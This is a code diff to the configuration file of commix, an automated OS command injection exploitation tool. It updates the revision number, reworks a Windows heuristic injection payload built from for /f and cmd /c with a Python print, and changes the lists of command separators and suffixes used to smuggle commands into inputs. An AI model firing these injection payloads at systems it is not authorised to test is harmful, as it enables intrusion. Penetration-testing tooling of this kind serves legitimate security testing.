@@ -241,7 +241,7 @@ DESCRIPTION_FULL = "Automated All-in-One OS Command Injection Exploitation Tool"
 DESCRIPTION = "The command injection exploiter"
 AUTHOR  = "Anastasios Stasinopoulos"
 VERSION_NUM = "3.5"
-REVISION = "91"
+REVISION = "92"
 STABLE_RELEASE = False
 if STABLE_RELEASE:
   VERSION = "v" + VERSION_NUM + "-stable"
@@ -288,6 +288,8 @@ USER_DEFINED_PYTHON_DIR = False
 LINUX_PYTHON_INTERPRETER = "python3"
 USER_DEFINED_PYTHON_INTERPRETER = False
 
+CMD_NUL = ""
+
 #Basic heuristic checks for command injections
 RAND_A = random.randint(1,10000)
 RAND_B = random.randint(1,10000)
@@ -298,7 +300,7 @@ BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + BASIC_STRING + ")&&echo $(" + B
                                    ]
 ALTER_SHELL_BASIC_STRING = " -c \"print(int(" + CALC_STRING + "))\""
 ALTER_SHELL_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")&&echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")||echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")",
-                                   "|for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p =%i< nul &for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p =%i< nul"
+                                   "|for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p=%i" + CMD_NUL + " &for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p=%i" + CMD_NUL
                                    ]
 BASIC_COMMAND_INJECTION_RESULT = str(RAND_A + RAND_B)
 IDENTIFIED_COMMAND_INJECTION = False
@@ -424,7 +426,7 @@ HTTP_HEADER = ""
 
 # The command injection separators.
 SEPARATORS = []
-DEFAULT_SEPARATORS = [";", "&", "|"]
+DEFAULT_SEPARATORS = ["", ";", "&", "|"]
 SPECIAL_SEPARATORS = ["&&", "||", "%0a", "%0d%0a", "%1a"]
 SEPARATORS_LVL1 = DEFAULT_SEPARATORS + SPECIAL_SEPARATORS  
 SEPARATORS_LVL3 = SEPARATORS_LVL2 = SEPARATORS_LVL1
@@ -437,7 +439,7 @@ PREFIXES_LVL3 = PREFIXES_LVL2 + ["'", "\""]
 
 # The command injection suffixes.
 SUFFIXES = []
-SUFFIXES_LVL1 = DEFAULT_SEPARATORS
+SUFFIXES_LVL1 = [""]
 SUFFIXES_LVL2 = SEPARATORS_LVL1
 SUFFIXES_LVL3 = SUFFIXES_LVL2 + ["'", "\"", " #", "//", "\\\\"]
 
